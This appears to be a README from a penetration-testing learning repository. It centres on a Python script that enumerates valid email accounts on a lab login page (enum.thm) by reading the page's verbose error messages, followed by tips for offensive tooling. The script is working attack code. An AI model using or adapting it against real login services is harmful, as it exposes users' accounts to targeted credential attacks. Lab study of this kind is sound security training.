# Python for Penetration Testing & Automation

![Category](https://img.shields.io/badge/Category-Scripting-blue.svg)
![Language](https://img.shields.io/badge/Language-Python_3-brightgreen.svg)
![Focus](https://img.shields.io/badge/Focus-Offensive_Automation-orange.svg)

A practical guide and codebase for developing custom Python offensive scripts, automated HTTP authentication fuzzers, and API testing tools.

---

## 📋 Executive Summary
Custom scripting is a defining differentiator between tool operators and proficient security engineers. This directory contains production-ready Python automation routines used to interact with web authentication services (`test.py` targeting `enum.thm`), handle session cookies, evaluate server responses, and automate credential testing.

* **Artifacts in Directory:**
  * `test.py`: Modular Python client for username and email enumeration
  * `test.php`: PHP testing script

---

## 🛠️ Code Breakdown: `test.py`

`test.py` demonstrates standard patterns for building robust offensive automation:

```python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (Pentest Automation)',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()
        if email:
            response_json = check_email(email)
            if response_json.get('status') == 'error' and invalid_error in response_json.get('message', ''):
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 test.py <email_list_file>")
        sys.exit(1)

    print("\nVerified Accounts:", enumerate_emails(sys.argv[1]))
```

---

## 💡 Best Practices for Offensive Python Tooling
1. **Use `requests.Session()`:** When executing repeated requests against a target, reuse persistent TCP sessions to reduce latency and socket overhead.
2. **Handle Timeouts & Retries:** Always supply a `timeout` argument (`requests.post(..., timeout=5)`) to prevent scripts from hanging indefinitely on dropped packets.
3. **Graceful Keyboard Interrupts:** Wrap main loops in `try: ... except KeyboardInterrupt:` blocks to cleanly exit and output partial findings.
